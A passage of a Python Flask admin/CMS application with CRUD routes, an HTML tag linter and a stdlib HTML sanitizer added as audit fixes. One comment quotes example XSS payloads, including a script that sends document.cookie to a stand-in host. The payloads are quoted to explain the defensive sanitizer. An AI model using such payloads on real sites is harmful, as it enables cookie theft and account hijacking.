        "status": r["status"], "page_type": r.get("page_type", "content"),
        # BUG FIX: "title" is a newly-added field (see PAGE_FIELDS in
        # lib_bejson_Management_content.py) — existing pages created
        # before this fix won't have it at all. Falls back to slug so the
        # editor still shows something recognizable instead of a blank
        # title field for those older rows.
        "title": r.get("title") or r["slug"],
        "meta_description": r.get("meta_description", ""), "layout": r.get("layout", "default"),
        "content_html": r.get("content_html", ""), "content_markdown": r.get("content_markdown", ""),
        "author": r.get("author", ""), "featured_image": r.get("featured_image", ""),
        "parent_page_id": r.get("parent_page_id_fk"), "sort_order": r.get("sort_order", 0),
        "created_at": r.get("created_at"), "updated_at": r.get("updated_at"),
    }

def post_to_dict(r):
    return {
        "id": r["id"], "category_id": r.get("category_id_fk"), "title": r["title"], "slug": r["slug"],
        "status": r["status"], "content_html": r.get("content_html", ""),
        "content_markdown": r.get("content_markdown", ""), "author": r.get("author", ""),
        "featured_image": r.get("featured_image", ""), "published_at": r.get("published_at", ""),
        "scheduled_at": r.get("scheduled_at", ""), "tag_ids": r.get("tag_ids") or [],
        "created_at": r.get("created_at"), "updated_at": r.get("updated_at"),
    }

def cms_category_to_dict(r):
    return {
        "id": r["id"], "parent_id": r.get("parent_id"), "category_type": r.get("category_type", "post"),
        "title": r["title"], "description": r.get("description", ""), "slug": r.get("slug", ""),
    }

def navlink_to_dict(r):
    return {
        "nav_id": r["nav_id"], "parent_id": r.get("parent_id"), "label": r["nav_label"],
        "url": r["nav_url"], "target": r.get("nav_target", "_self"),
        "position": r.get("nav_position", 0), "active": bool(r.get("nav_active", True)),
    }

def admin_media_to_dict(r):
    file_type = r.get("file_type")
    external_url = r.get("external_url", "")

    if file_type == "youtube":
        video_id = MediaLib._extract_youtube_id(external_url) or ""
        url = external_url
        thumbnail_url = f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg" if video_id else None
    elif file_type == "external_image":
        url = external_url
        thumbnail_url = external_url
    else:
        url = f"/media-files/{os.path.basename(r['original_path'])}" if r.get("original_path") else None
        thumbnail_url = url

    return {
        "media_id": r["media_id"], "filename": r["filename"], "file_type": file_type,
        "mime_type": r.get("mime_type"), "file_size_bytes": r.get("file_size_bytes"),
        "width": r.get("width"), "height": r.get("height"), "file_hash": r.get("file_hash", ""),
        "webp_path": r.get("webp_path", ""), "alt_text": r.get("alt_text", ""),
        "external_url": external_url, "url": url, "thumbnail_url": thumbnail_url,
    }

# ── Config now lives in lib_bejson_Management_config.py ─────────────────

# ── Routes ───────────────────────────────────────────────────

@app.route("/")
def index():
    # AUDIT FIX (H-1, round 2): no longer passes admin_token to the
    # template — see the block above _require_admin_token for why that
    # was a full auth bypass. The page now prompts for the token
    # client-side instead of being handed it for free.
    return render_template("index.html", version=VERSION)

# LINKS

@app.route("/api/links", methods=["GET"])
def get_links():
    links = [link_to_dict(r) for r in LinksLib.management_links_list(str(LINKS_MANIFEST))]
    cats = {}
    for lnk in links:
        cats.setdefault(lnk["category"] or "Uncategorized", []).append(lnk)
    link_categories = [cat_to_dict(r) for r in LinksLib.management_links_category_list(str(LINKS_MANIFEST))]
    return jsonify({"links": links, "categories": cats, "link_categories": link_categories})

@app.route("/api/links", methods=["POST"])
def add_link():
    data = request.get_json(silent=True) or {}
    missing = [f for f in ["title", "url"] if not (data.get(f) or "").strip()]
    if missing: return jsonify({"error": f"Missing: {', '.join(missing)}"}), 400
    lid = LinksLib.management_links_add(
        str(LINKS_MANIFEST),
        title=data["title"].strip(),
        url=data["url"].strip(),
        category=data.get("category") or None,
        icon=(data.get("icon") or "").strip(),
        description=(data.get("description") or "").strip(),
    )
    return jsonify({"ok": True, "link_id": lid})

@app.route("/api/links/<lid>", methods=["PUT"])
def update_link(lid):
    data = request.get_json(silent=True) or {}
    fields = {}
    if "title"       in data: fields["label"]       = (data["title"] or "").strip()
    if "url"         in data: fields["url"]         = (data["url"] or "").strip()
    if "category"    in data: fields["category"]    = data["category"] or None
    if "icon"        in data: fields["icon"]        = (data["icon"] or "").strip()
    if "description" in data: fields["description"] = (data["description"] or "").strip()
    if LinksLib.management_links_update(str(LINKS_MANIFEST), lid, **fields):
        return jsonify({"ok": True})
    return jsonify({"error": "Not found"}), 404

@app.route("/api/links/<lid>", methods=["DELETE"])
def delete_link(lid):
    if LinksLib.management_links_delete(str(LINKS_MANIFEST), lid):
        return jsonify({"ok": True})
    return jsonify({"error": "Not found"}), 404

# LINK CATEGORIES

@app.route("/api/link-categories", methods=["GET"])
def get_link_categories():
    return jsonify({"categories": [cat_to_dict(r) for r in LinksLib.management_links_category_list(str(LINKS_MANIFEST))]})

@app.route("/api/link-categories", methods=["POST"])
def add_link_category():
    data = request.get_json(silent=True) or {}
    name = (data.get("cat_name") or "").strip()
    if not name: return jsonify({"error": "cat_name required"}), 400
    existing = [c["cat_name"].lower() for c in LinksLib.management_links_category_list(str(LINKS_MANIFEST))]
    if name.lower() in existing: return jsonify({"error": "Category already exists"}), 409
    cid = LinksLib.management_links_category_add(str(LINKS_MANIFEST), name)
    return jsonify({"ok": True, "cat_id": cid})

@app.route("/api/link-categories/<cid>", methods=["PUT"])
def update_link_category(cid):
    data = request.get_json(silent=True) or {}
    name = (data.get("cat_name") or "").strip()
    if not name: return jsonify({"error": "cat_name required"}), 400
    cats = LinksLib.management_links_category_list(str(LINKS_MANIFEST))
    if not any(c["cat_id"] == cid for c in cats):
        return jsonify({"error": "Not found"}), 404
    MFDBCore.mfdb_core_update_entity_record_bulk(
        str(LINKS_MANIFEST), "LinkCategory",
        next(i for i, c in enumerate(cats) if c["cat_id"] == cid),
        {"cat_name": name},
    )
    return jsonify({"ok": True})

@app.route("/api/link-categories/<cid>", methods=["DELETE"])
def delete_link_category(cid):
    # management_links_category_delete already self-heals: nulls out
    # category on any links that referenced it before removing the category.
    if not LinksLib.management_links_category_delete(str(LINKS_MANIFEST), cid):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

# NOTE CATEGORIES

@app.route("/api/note-categories", methods=["GET"])
def get_note_categories():
    return jsonify({"categories": [cat_to_dict(r) for r in NotesLib.management_notes_category_list(str(NOTES_MANIFEST))]})

@app.route("/api/note-categories", methods=["POST"])
def add_note_category():
    data = request.get_json(silent=True) or {}
    name = (data.get("cat_name") or "").strip()
    if not name: return jsonify({"error": "cat_name required"}), 400
    existing = [c["cat_name"].lower() for c in NotesLib.management_notes_category_list(str(NOTES_MANIFEST))]
    if name.lower() in existing: return jsonify({"error": "Category already exists"}), 409
    cid = NotesLib.management_notes_category_add(str(NOTES_MANIFEST), name)
    return jsonify({"ok": True, "cat_id": cid})

@app.route("/api/note-categories/<cid>", methods=["PUT"])
def update_note_category(cid):
    data = request.get_json(silent=True) or {}
    name = (data.get("cat_name") or "").strip()
    if not name: return jsonify({"error": "cat_name required"}), 400
    cats = NotesLib.management_notes_category_list(str(NOTES_MANIFEST))
    if not any(c["cat_id"] == cid for c in cats):
        return jsonify({"error": "Not found"}), 404
    MFDBCore.mfdb_core_update_entity_record_bulk(
        str(NOTES_MANIFEST), "NoteCategory",
        next(i for i, c in enumerate(cats) if c["cat_id"] == cid),
        {"cat_name": name},
    )
    return jsonify({"ok": True})

@app.route("/api/note-categories/<cid>", methods=["DELETE"])
def delete_note_category(cid):
    if not NotesLib.management_notes_category_delete(str(NOTES_MANIFEST), cid):
        return jsonify({"error": "Not found"}), 404
    # Null out notes that referenced this category
    for i, n in enumerate(NotesLib.management_notes_list(str(NOTES_MANIFEST))):
        if n["category"] == cid:
            MFDBCore.mfdb_core_update_entity_record(str(NOTES_MANIFEST), "Note", i, "category", None)
    return jsonify({"ok": True})

# NOTES

@app.route("/api/notes", methods=["GET"])
def get_notes():
    notes = [note_to_dict(r) for r in NotesLib.management_notes_list(str(NOTES_MANIFEST))]
    cats  = [cat_to_dict(r)  for r in NotesLib.management_notes_category_list(str(NOTES_MANIFEST))]
    return jsonify({"notes": notes, "categories": cats})

# AUDIT FIX (M-2, round 2): the round-1 pass validated note_color only on
# the RENDER path (templates/index.html's card background) — the round-2
# audit correctly flagged that the SAVE path still round-trips whatever
# value is sent, so a raw API call (bypassing the swatch-only UI) could
# still store a non-palette value, which the next render would then just
# fall back from rather than actually rejecting. Mirrors the frontend's
# NOTE_COLS list — kept in sync manually since this is Python, not shared
# JS/Py constants; if the swatch palette in templates/index.html changes,
# update this too.
_NOTE_COLS = frozenset(("#f5f5f5", "#fef9c3", "#d1fae5", "#dbeafe", "#fce7f3", "#ede9fe"))

def _clean_note_color(value):
    return value if value in _NOTE_COLS else "#f5f5f5"

@app.route("/api/notes", methods=["POST"])
def add_note():
    data = request.get_json(silent=True) or {}
    if not (data.get("note_title") or "").strip():
        return jsonify({"error": "note_title required"}), 400
    nid = NotesLib.management_notes_add(
        str(NOTES_MANIFEST),
        title=data["note_title"].strip(),
        content=(data.get("note_content") or "").strip(),
        color=_clean_note_color(data.get("note_color")),
        category=data.get("note_category") or None,
    )
    return jsonify({"ok": True, "note_id": nid})

@app.route("/api/notes/<nid>", methods=["PUT"])
def update_note(nid):
    data = request.get_json(silent=True) or {}
    fields = {}
    if "note_title"    in data: fields["label"]    = (data["note_title"] or "").strip()
    if "note_content"  in data: fields["content"]  = (data["note_content"] or "").strip()
    if "note_color"    in data: fields["color"]    = _clean_note_color(data.get("note_color"))
    if "note_category" in data: fields["category"] = data["note_category"] or None
    if NotesLib.management_notes_update(str(NOTES_MANIFEST), nid, **fields):
        return jsonify({"ok": True})
    return jsonify({"error": "Not found"}), 404

@app.route("/api/notes/<nid>", methods=["DELETE"])
def delete_note(nid):
    if NotesLib.management_notes_delete(str(NOTES_MANIFEST), nid):
        return jsonify({"ok": True})
    return jsonify({"error": "Not found"}), 404

# TODOS

@app.route("/api/todos", methods=["GET"])
def get_todos():
    order = {"high": 0, "medium": 1, "low": 2}
    todos = [todo_to_dict(r) for r in TasksLib.management_tasks_list(str(TASKS_MANIFEST))]
    todos.sort(key=lambda t: (t["done"], order.get(t["priority"] or "low", 2)))
    task_categories = [cat_to_dict(r) for r in TasksLib.management_tasks_category_list(str(TASKS_MANIFEST))]
    return jsonify({"todos": todos, "task_categories": task_categories})

@app.route("/api/todos", methods=["POST"])
def add_todo():
    data = request.get_json(silent=True) or {}
    if not (data.get("todo_text") or "").strip():
        return jsonify({"error": "todo_text required"}), 400
    tid = TasksLib.management_tasks_add(
        str(TASKS_MANIFEST),
        text=data["todo_text"].strip(),
        priority=data.get("priority", "medium"),
        detail=(data.get("todo_detail") or "").strip(),
        category=data.get("todo_category") or None,
    )
    return jsonify({"ok": True, "todo_id": tid})

@app.route("/api/todos/<tid>", methods=["PUT"])
def update_todo(tid):
    data = request.get_json(silent=True) or {}
    fields = {}
    if "todo_text"     in data: fields["label"]    = (data["todo_text"] or "").strip()
    if "done"          in data: fields["done"]     = bool(data["done"])
    if "priority"      in data: fields["priority"] = data["priority"] or "medium"
    if "todo_detail"   in data: fields["detail"]   = (data["todo_detail"] or "").strip()
    if "todo_category" in data: fields["category"] = data["todo_category"] or None
    if TasksLib.management_tasks_update(str(TASKS_MANIFEST), tid, **fields):
        return jsonify({"ok": True})
    return jsonify({"error": "Not found"}), 404

@app.route("/api/todos/<tid>", methods=["DELETE"])
def delete_todo(tid):
    if TasksLib.management_tasks_delete(str(TASKS_MANIFEST), tid):
        return jsonify({"ok": True})
    return jsonify({"error": "Not found"}), 404

@app.route("/api/todos/clear-done", methods=["POST"])
def clear_done_todos():
    for t in TasksLib.management_tasks_list(str(TASKS_MANIFEST)):
        if t["done"] is True:
            TasksLib.management_tasks_delete(str(TASKS_MANIFEST), t["id"])
    return jsonify({"ok": True})

# TASK CATEGORIES

@app.route("/api/task-categories", methods=["GET"])
def get_task_categories():
    return jsonify({"categories": [cat_to_dict(r) for r in TasksLib.management_tasks_category_list(str(TASKS_MANIFEST))]})

@app.route("/api/task-categories", methods=["POST"])
def add_task_category():
    data = request.get_json(silent=True) or {}
    name = (data.get("cat_name") or "").strip()
    if not name: return jsonify({"error": "cat_name required"}), 400
    existing = [c["cat_name"].lower() for c in TasksLib.management_tasks_category_list(str(TASKS_MANIFEST))]
    if name.lower() in existing: return jsonify({"error": "Category already exists"}), 409
    cid = TasksLib.management_tasks_category_add(str(TASKS_MANIFEST), name)
    return jsonify({"ok": True, "cat_id": cid})

@app.route("/api/task-categories/<cid>", methods=["PUT"])
def update_task_category(cid):
    data = request.get_json(silent=True) or {}
    name = (data.get("cat_name") or "").strip()
    if not name: return jsonify({"error": "cat_name required"}), 400
    cats = TasksLib.management_tasks_category_list(str(TASKS_MANIFEST))
    if not any(c["cat_id"] == cid for c in cats):
        return jsonify({"error": "Not found"}), 404
    MFDBCore.mfdb_core_update_entity_record_bulk(
        str(TASKS_MANIFEST), "TaskCategory",
        next(i for i, c in enumerate(cats) if c["cat_id"] == cid),
        {"cat_name": name},
    )
    return jsonify({"ok": True})

@app.route("/api/task-categories/<cid>", methods=["DELETE"])
def delete_task_category(cid):
    # management_tasks_category_delete already self-heals: nulls out
    # category on any tasks that referenced it before removing the category.
    if not TasksLib.management_tasks_category_delete(str(TASKS_MANIFEST), cid):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

# CMS: PAGES (public-hosting layer — lib_bejson_Management_content.py)

# AUDIT FIX (L-4, round 2): the malformed "<H2O>Post Title Test</h2>" seed
# was fixed as *data* in the round-1 pass, but nothing in the routes below
# actually validated content_html on the way in — so a fresh instance of
# the same bug class (unbalanced/mismatched tags) could be saved again at
# any time, and was, when the seed was re-created. Minimal balanced-tag
# lint at the point of save: reject a start/end tag mismatch (exactly what
# "<H2O>…</h2>" is — an opening "h2o" tag closed by "h2") or a tag left
# unclosed at the end of the content. Void elements (br/img/hr/etc.) and
# self-closing tags are exempt, as is anything that isn't valid-enough
# HTML to tokenize as tags at all (plain text, markdown source) — this is
# a lint against broken *tags*, not a strict HTML validator.
from html.parser import HTMLParser as _HTMLParser
import html as _html_mod

def management_cms_shared_esc(text) -> str:
    """
    Local copy of lib_bejson_Management_shared.py's own
    management_cms_shared_esc() — app.py doesn't otherwise import that
    module (it's the export-time library, this is the admin app), and
    pulling in the whole module for one function isn't worth the
    coupling. Kept in exact parity (same stdlib call, same quote=True)
    with the original; if that one changes, update this too.
    """
    return _html_mod.escape(str(text or ""), quote=True)

_VOID_ELEMENTS = frozenset((
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr",
))

class _ContentHtmlLinter(_HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.stack = []
        self.issues = []
    def handle_starttag(self, tag, attrs):
        if tag not in _VOID_ELEMENTS:
            self.stack.append(tag)
    def handle_startendtag(self, tag, attrs):
        pass  # self-closing (<tag/>) — never pushed, nothing to balance
    def handle_endtag(self, tag):
        if self.stack and self.stack[-1] == tag:
            self.stack.pop()
        elif tag in self.stack:
            # Closes an ancestor further up — treat everything in between
            # as implicitly closed (matches real browser/HTML5 recovery
            # behavior for cases like unclosed <li>/<p>) rather than
            # flagging every legitimate omitted-closing-tag pattern.
            while self.stack and self.stack[-1] != tag:
                self.stack.pop()
            if self.stack:
                self.stack.pop()
        else:
            self.issues.append(f"</{tag}> has no matching opening tag")

def _lint_content_html(html_str: str):
    """Returns a list of human-readable problems (empty = OK)."""
    if not html_str or not html_str.strip():
        return []
    linter = _ContentHtmlLinter()
    try:
        linter.feed(html_str)
        linter.close()
    except Exception:
        return []  # not well-formed enough to tokenize as HTML at all — not this lint's job
    issues = list(linter.issues)
    if linter.stack:
        issues.append(f"unclosed tag(s): {', '.join('<'+t+'>' for t in linter.stack)}")
    return issues

# AUDIT FIX (SEC-01): _lint_content_html() above only ever checked tag
# BALANCE — it happily accepted, and this app happily stored and
# published verbatim to Export/ (a public website), things like
# <script>fetch('https://evil.example/?c='+document.cookie)</script>,
# <img src=x onerror="...">, and <a href="javascript:alert(1)">. Today's
# blast radius is bounded (only an authenticated admin can inject), but
# a leaked token, a future multi-user mode, or imported content all turn
# this into real stored XSS on a public site.
#
# nh3 (the audit's suggested library) was evaluated and deliberately NOT
# used: it's a Rust extension distributed only as prebuilt wheels for
# manylinux/glibc targets, and this project's actual deployment target
# is Termux on Android, which uses Bionic libc, not glibc — the same
# platform-mismatch class of problem already hit (and avoided) with
# hash-pinning in requirements.txt (see that file's own comment). Adding
# nh3 risked breaking `pip install` on-device, which is worse than not
# sanitizing at all. This sanitizer is stdlib-only (html.parser, same
# module the linter above already depends on), so it carries zero new
# platform risk.
#
# Runs as a SECOND, independent pass after _lint_content_html() at every
# save site — lint rejects clearly broken markup with an actionable
# error (so an author sees why their save failed); sanitize then defangs
# anything that passed lint but still isn't an allowed tag/attribute/URL
# scheme, so a save can never silently persist an executable payload.
_SANITIZE_ALLOWED_TAGS = frozenset((
    "p", "b", "i", "em", "strong", "u", "s", "a",
    "h1", "h2", "h3", "h4", "h5", "h6",
    "ul", "ol", "li", "br", "hr", "img", "blockquote", "pre", "code",
    "figure", "figcaption", "table", "thead", "tbody", "tr", "th", "td",
    "span", "sub", "sup",
))
# Tags whose CONTENT must also be discarded, not just the tag itself —
# unlike e.g. a stripped <div>, the text inside <script>/<style> was
# never meant to be visible page content.
_SANITIZE_STRIP_CONTENT_TAGS = frozenset(("script", "style", "noscript"))
_SANITIZE_ALLOWED_ATTRS = {
    "a": frozenset(("href", "title")),
    "img": frozenset(("src", "alt", "width", "height")),
    "td": frozenset(("colspan", "rowspan")),
    "th": frozenset(("colspan", "rowspan")),
}
_SANITIZE_URL_ATTRS = frozenset(("href", "src"))
_SANITIZE_ALLOWED_SCHEMES = frozenset(("http", "https", "mailto"))

def _sanitize_is_safe_url(value: str) -> bool:
    value = (value or "").strip()
    if not value:
        return False
    # A scheme is everything before the first ':' PROVIDED it looks like
    # scheme:rest per RFC 3986 (letters/digits/+/-/. only) — anything
    # else (a bare relative path like "/media/x.png", "posts/x.html",
    # or a path containing a literal colon with no valid scheme syntax
    # before it, e.g. "a:b/c") is treated as schemeless/relative, which
    # is safe and is how nearly every real link/image in this app's own
    # content is written.
    colon = value.find(":")
    if colon == -1:
        return True  # relative URL, no scheme at all
    scheme = value[:colon]
    if not re.match(r"^[A-Za-z][A-Za-z0-9+.\-]*$", scheme):
        return True  # not a valid scheme syntax -> treat as relative/safe
    return scheme.lower() in _SANITIZE_ALLOWED_SCHEMES

class _ContentHtmlSanitizer(_HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.out = []
        # Stack of (tag, kept: bool) so end tags only close what their
        # matching start tag actually did, and so content inside a
        # dropped script/style can be suppressed until its real end tag.
        self.stack = []
        self.skip_depth = 0  # >0 while inside a dropped script/style/noscript

    def _emit_starttag(self, tag, attrs, self_closing):
        if tag in _SANITIZE_STRIP_CONTENT_TAGS:
            if not self_closing:
                self.stack.append((tag, False))
                self.skip_depth += 1
            return
        if self.skip_depth > 0:
            # Inside a stripped script/style — track nesting of the same
            # tag name so an inner <script> doesn't end the skip early,
            # but don't emit anything.
            if not self_closing:
                self.stack.append((tag, False))
            return
        if tag not in _SANITIZE_ALLOWED_TAGS:
            # Drop the tag, keep processing its children as if unwrapped
            # (e.g. a stripped <div>'s text content is still real page
            # content and should survive).
            if not self_closing:
                self.stack.append((tag, False))
            return
        allowed_attrs = _SANITIZE_ALLOWED_ATTRS.get(tag, frozenset())
        kept_attrs = []
        for name, val in attrs:
            name = (name or "").lower()
            if name not in allowed_attrs:
                continue  # silently drops onerror=, onclick=, style=, etc. for every tag
            if name in _SANITIZE_URL_ATTRS and not _sanitize_is_safe_url(val or ""):
                continue  # drops javascript:/data:/etc. — the tag itself survives without this attr
            kept_attrs.append(f'{name}="{management_cms_shared_esc(val or "")}"')
        attr_str = (" " + " ".join(kept_attrs)) if kept_attrs else ""
        if self_closing or tag in _VOID_ELEMENTS:
            self.out.append(f"<{tag}{attr_str}>")
        else:
            self.out.append(f"<{tag}{attr_str}>")
            self.stack.append((tag, True))

    def handle_starttag(self, tag, attrs):
        self._emit_starttag(tag.lower(), attrs, self_closing=False)

    def handle_startendtag(self, tag, attrs):
        self._emit_starttag(tag.lower(), attrs, self_closing=True)

    def handle_endtag(self, tag):
        tag = tag.lower()
        if not self.stack:
            return
        # Find the matching open entry from the top, same recovery
        # approach as the linter above (closes everything back to the
        # matching tag rather than only ever popping exactly one).
        for idx in range(len(self.stack) - 1, -1, -1):
            if self.stack[idx][0] == tag:
                while len(self.stack) > idx:
                    popped_tag, was_kept = self.stack.pop()
                    if popped_tag in _SANITIZE_STRIP_CONTENT_TAGS:
                        self.skip_depth -= 1
                    elif was_kept:
                        self.out.append(f"</{popped_tag}>")
                break
            # tag not found in stack at all -- stray end tag, ignore

    def handle_data(self, data):
        if self.skip_depth > 0:
            return
        self.out.append(management_cms_shared_esc(data))

    def close_out(self):
        # Anything still open at EOF (matches the linter's own
        # "unclosed tag" tolerance) — close kept tags so output stays
        # well-formed rather than leaking an unclosed element.
        while self.stack:
            popped_tag, was_kept = self.stack.pop()
            if popped_tag in _SANITIZE_STRIP_CONTENT_TAGS:
                self.skip_depth -= 1
            elif was_kept:
                self.out.append(f"</{popped_tag}>")
        return "".join(self.out)

def _sanitize_content_html(html_str: str) -> str:
    """
    Defangs content_html for storage: unknown tags are unwrapped (their
    text kept), disallowed attributes (onerror=, onclick=, style=, etc.)
    are dropped, disallowed URL schemes (javascript:, data:, etc.) on
    href=/src= are dropped, and <script>/<style>/<noscript> are removed
    tag-and-content. Always call AFTER _lint_content_html() has already
    accepted the input — this doesn't validate structure, only content.
    """
    if not html_str or not html_str.strip():
        return html_str or ""
    sanitizer = _ContentHtmlSanitizer()
    try:
        sanitizer.feed(html_str)
        sanitizer.close()
    except Exception:
        return ""  # unparseable — fail closed rather than store something unvetted
    return sanitizer.close_out()

@app.route("/api/pages", methods=["GET"])
def list_pages():
    status = request.args.get("status") or None
    pages = CmsContent.management_cms_content_list_pages(str(CMS_MANIFESTS["cms_page"]), status=status)
    return jsonify({"pages": [page_to_dict(r) for r in pages]})

@app.route("/api/pages", methods=["POST"])
def create_page():
    d = request.get_json(silent=True) or {}
    if not d.get("title"):
        return jsonify({"error": "title is required"}), 400
    # AUDIT FIX (L-4, round 2): reject malformed content_html at save time.
    issues = _lint_content_html(d.get("content_html", ""))
    if issues:
        return jsonify({"error": "content_html has malformed markup: " + "; ".join(issues)}), 400
    # AUDIT FIX (SEC-01): defang whatever passed the lint above before it
    # ever reaches storage/export — see _sanitize_content_html()'s own
    # comment for what this does and why nh3 wasn't used.
    sanitized_content_html = _sanitize_content_html(d.get("content_html", ""))
    pid = CmsContent.management_cms_content_create_page(
        str(CMS_MANIFESTS["cms_page"]), d["title"], slug=d.get("slug", ""),
        category_id_fk=d.get("category_id_fk", d.get("category_id")), page_type=d.get("page_type", "content"),
        meta_description=d.get("meta_description", ""), layout=d.get("layout", "default"),
        author=d.get("author", ""), featured_image=d.get("featured_image", ""),
        parent_page_id_fk=d.get("parent_page_id"), sort_order=d.get("sort_order", 0),
        status=d.get("status", "draft"), content_html=sanitized_content_html,
        content_markdown=d.get("content_markdown", ""),
    )
    return jsonify({"ok": True, "id": pid})

@app.route("/api/pages/<pid>", methods=["PUT"])
def update_page(pid):
    d = request.get_json(silent=True) or {}
    # AUDIT FIX (L-4, round 2): reject malformed content_html on update too.
    if "content_html" in d:
        issues = _lint_content_html(d.get("content_html", ""))
        if issues:
            return jsonify({"error": "content_html has malformed markup: " + "; ".join(issues)}), 400
        # AUDIT FIX (SEC-01): sanitize in place so the fields dict built
        # below picks up the defanged version automatically.
        d["content_html"] = _sanitize_content_html(d["content_html"])
    fields = {k: v for k, v in d.items() if k in (
        "title", "slug", "category_id_fk", "page_type", "meta_description", "layout",
        "content_html", "content_markdown", "author", "featured_image",
        "parent_page_id_fk", "sort_order", "status")}
    if not CmsContent.management_cms_content_update_page(str(CMS_MANIFESTS["cms_page"]), pid, **fields):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/pages/<pid>", methods=["DELETE"])
def delete_page(pid):
    if not CmsContent.management_cms_content_delete_page(str(CMS_MANIFESTS["cms_page"]), pid):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

# CMS: POSTS

@app.route("/api/posts", methods=["GET"])
def list_posts():
    status = request.args.get("status", "published")
    if status == "all":
        status = None
    posts = CmsContent.management_cms_content_list_posts(str(CMS_MANIFESTS["cms_post"]), status=status)
    return jsonify({"posts": [post_to_dict(r) for r in posts]})

@app.route("/api/posts", methods=["POST"])
def create_post():
    d = request.get_json(silent=True) or {}
    if not d.get("title"):
        return jsonify({"error": "title is required"}), 400
    # AUDIT FIX (L-4, round 2): reject malformed content_html at save time.
    issues = _lint_content_html(d.get("content_html", ""))
    if issues:
        return jsonify({"error": "content_html has malformed markup: " + "; ".join(issues)}), 400
    # AUDIT FIX (SEC-01): defang whatever passed the lint above before it
    # ever reaches storage/export — see _sanitize_content_html()'s own
    # comment for what this does and why nh3 wasn't used.
    sanitized_content_html = _sanitize_content_html(d.get("content_html", ""))
    pid = CmsContent.management_cms_content_create_post(
        str(CMS_MANIFESTS["cms_post"]), d["title"], slug=d.get("slug", ""),
        category_id_fk=d.get("category_id_fk", d.get("category_id")), tag_ids=d.get("tag_ids"),
        author=d.get("author", ""), featured_image=d.get("featured_image", ""),
        status=d.get("status", "draft"), content_html=sanitized_content_html,
        content_markdown=d.get("content_markdown", ""), scheduled_at=d.get("scheduled_at", ""),
    )
    return jsonify({"ok": True, "id": pid})

@app.route("/api/posts/<pid>", methods=["PUT"])
def update_post(pid):
    d = request.get_json(silent=True) or {}
    # AUDIT FIX (L-4, round 2): reject malformed content_html on update too.
    if "content_html" in d:
        issues = _lint_content_html(d.get("content_html", ""))
        if issues:
            return jsonify({"error": "content_html has malformed markup: " + "; ".join(issues)}), 400
        # AUDIT FIX (SEC-01): sanitize in place so the fields dict built
        # below picks up the defanged version automatically.
        d["content_html"] = _sanitize_content_html(d["content_html"])
    fields = {k: v for k, v in d.items() if k in (
        "title", "slug", "category_id_fk", "tag_ids", "author", "featured_image",
        "status", "content_html", "content_markdown", "scheduled_at")}
    if not CmsContent.management_cms_content_update_post(str(CMS_MANIFESTS["cms_post"]), pid, **fields):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/posts/<pid>", methods=["DELETE"])
def delete_post(pid):
    if not CmsContent.management_cms_content_delete_post(str(CMS_MANIFESTS["cms_post"]), pid):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/posts/<pid>/publish", methods=["POST"])
def publish_post(pid):
    if not CmsContent.management_cms_content_publish_post(str(CMS_MANIFESTS["cms_post"]), pid):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/posts/<pid>/archive", methods=["POST"])
def archive_post(pid):
    if not CmsContent.management_cms_content_archive_post(str(CMS_MANIFESTS["cms_post"]), pid):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

# CMS: CATEGORIES (shared, hierarchical — lib_bejson_Management_taxonomy.py)

@app.route("/api/categories", methods=["GET"])
def list_categories():
    category_type = request.args.get("type") or None
    cats = CmsTaxonomy.management_cms_taxonomy_get_categories(str(CMS_MANIFESTS["cms_category"]), category_type)
    return jsonify({"categories": [cms_category_to_dict(r) for r in cats]})

@app.route("/api/categories/tree", methods=["GET"])
def category_tree():
    category_type = request.args.get("type", "post")
    return jsonify({"tree": CmsTaxonomy.management_cms_taxonomy_get_category_tree(
        str(CMS_MANIFESTS["cms_category"]), category_type)})

@app.route("/api/categories", methods=["POST"])
def create_category():
    d = request.get_json(silent=True) or {}
    if not d.get("title"):
        return jsonify({"error": "title is required"}), 400
    cid = CmsTaxonomy.management_cms_taxonomy_add_category(
        str(CMS_MANIFESTS["cms_category"]), d["title"], slug=d.get("slug", ""),
        category_type=d.get("category_type", "post"), description=d.get("description", ""),
        parent_id=d.get("parent_id"),
    )
    return jsonify({"ok": True, "id": cid})

@app.route("/api/categories/<cid>", methods=["PUT"])
def update_category(cid):
    d = request.get_json(silent=True) or {}
    fields = {k: v for k, v in d.items() if k in ("title", "description", "slug", "category_type", "parent_id")}
    if "parent_id" in fields and fields["parent_id"]:
        # AUDIT FIX (M-7): neither this route nor the drag-drop JS
        # checked for a cycle (dragging a category onto one of its own
        # descendants) — only direct self-parenting (id == new parent_id)
        # was blocked, client-side only. A cycle here isn't just bad
        # data: management_cms_taxonomy_get_category_tree() and the
        # static builder's category-archive generation both walk the
        # parent chain, and a cycle would hang or stack-overflow them.
        # Checked server-side (not just in the drag-drop handler) so this
        # is closed regardless of entry point — CLI, raw API call, or UI.
        all_cats = {c["id"]: c.get("parent_id") for c in CmsTaxonomy.management_cms_taxonomy_get_categories(str(CMS_MANIFESTS["cms_category"]))}
        walk = fields["parent_id"]
        seen = set()
        while walk:
            if walk == cid:
                return jsonify({"error": "Cannot move a category under its own descendant — that would create a cycle"}), 400
            if walk in seen:
                break  # existing cycle elsewhere in the data; don't hang on it, just stop walking
            seen.add(walk)
            walk = all_cats.get(walk)
    if not CmsTaxonomy.management_cms_taxonomy_update_category(str(CMS_MANIFESTS["cms_category"]), cid, **fields):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/categories/<cid>", methods=["DELETE"])
def delete_category(cid):
    if not CmsTaxonomy.management_cms_taxonomy_delete_category(str(CMS_MANIFESTS["cms_category"]), cid):
        return jsonify({"error": "Not found"}), 404
    # BUG FIX: the taxonomy delete only re-parents child categories — it has
    # no way to reach Page/Post's manifests (different files, and taxonomy.py
    # doesn't import content.py to avoid a circular dependency), so any
    # page/post that referenced this category was left with a category_id_fk
